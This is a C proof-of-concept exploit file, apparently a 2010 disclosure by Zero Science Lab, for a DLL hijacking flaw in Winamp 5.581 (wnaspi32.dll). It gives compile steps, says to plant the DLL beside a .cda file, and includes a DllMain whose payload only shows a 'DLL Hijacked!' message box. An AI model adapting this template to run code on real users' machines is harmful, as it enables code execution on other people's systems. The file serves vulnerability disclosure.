/*

 Nullsoft Winamp 5.581 (wnaspi32.dll) DLL Hijacking Exploit

 Vendor: Nullsoft.
 Product Web Page: http://www.winamp.com
 Affected Version: 5.581 (x86)

 Summary: Winamp is a media player for Windows-based PCs,
 written by Nullsoft, now a subsidiary of AOL. It is
 proprietary freeware/shareware, multi-format, extensible
 with plug-ins and skins, and is noted for its graphical
 sound visualization, playlist, and media library features.

 Desc: Winamp 5.581 suffers from a dll hijacking vulnerability
 that enables the attacker to execute arbitrary code on a local
 level. The vulnerable extensions are .669, .aac, .aiff, .amf,
 .au, .avr, .b4s, .caf and .cda thru wnaspi32.dll and dwmapi.dll
 libraries.

 ----
 gcc -shared -o wnaspi32.dll winamp.c

 Compile and rename to wnaspi32.dll, create a file test.cda and put both
 files in same dir and execute.
 ----

 Tested on Microsoft Windows XP Professional SP3 (EN)



 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
 liquidworm gmail com

 Zero Science Lab - http://www.zeroscience.mk


 25.08.2010

*/


#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		dll_mll();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

int dll_mll()
{
	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}